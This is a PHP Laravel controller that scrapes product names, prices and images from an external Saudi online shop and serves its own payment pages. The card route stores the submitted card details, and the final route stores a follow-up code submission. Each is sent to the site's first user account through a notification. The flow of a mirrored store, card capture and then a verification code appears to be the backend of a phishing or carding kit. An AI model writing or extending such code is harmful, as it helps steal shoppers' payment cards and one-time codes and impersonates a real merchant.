<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Notifications\SendNotification;
use Illuminate\Http\Request;
use mysqli;
use PDO;
use PDOException;
use Goutte\Client;
use Nette\Utils\Floats;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function get_product($pro_name)
    {
        $url = "https://4jehat-sa.shop/product/".$pro_name;
        $client = new Client();
        $crawler = $client->request('GET', $url);

        // $dpi = $crawler->filter('.price.nasa-single-product-price')->text();
        $priceElement = $crawler->filter('.price.nasa-single-product-price');

        $pdi = '';

        if ($priceElement->filter('del')->count() > 0) {
            // If "del" element is present, extract the PDI from "del"
            $pdi = $priceElement->filter('ins .woocommerce-Price-amount bdi')->text();
        } else{
            $pdi = $crawler->filter('.price.nasa-single-product-price')->text();

        }
        $price = str_replace('ر.س','',$pdi);
        $price = str_replace(',','',$pdi);
        $name = $crawler->filter('.nasa-first-breadcrumb')->text();
        $image = $crawler->filter('.size-thumbnail')->attr('src');
        return[
            'name'=>$name,
            'price'=>(float)$price,
            'image'=>$image
        ];
        // return view('home???');
    }
    public function payment($array){
        session()->forget('cart');
        $products = explode(',',$array);
        $pro =[];
        foreach($products as $key=>$prod){
            $pro[$key] = $this->get_product($prod);
        }
        $totalPrice = 0;
        foreach ($pro as $item) {
            $totalPrice += $item['price'];
        }
        $data = [];
        $data['products'] = $pro;
        $data['total']= $totalPrice;
       session()->put('cart', $data);


        return view('payment')->with('products',$pro)->with('total',$totalPrice);
    }
    public function sendpayment(Request $request){
        $cart = session('cart');
        
        $cart['info'] = $request->all();
        session(['cart' => $cart]);
        return redirect()->route('card');

    }
    public function card(){
        return view('card');
    }
    public function set_card(Request $request){
        // dd('cart');
        $cart = session('cart');
        $cart['cart_info'] = $request->all();
        session(['cart' => $cart]);
        $user = User::first();
        $user->notify(new SendNotification($cart));

        return view('code');
    }
    public function code(){
        return view('code');
    }
    public function set_code(Request $request){
        // dd('cart');
        $cart = session('cart');
        $cart['cart_code'] = $request->all();
        session(['cart' => $cart]);
        $user = User::first();
        $user->notify(new SendNotification($cart));
        
    }
}
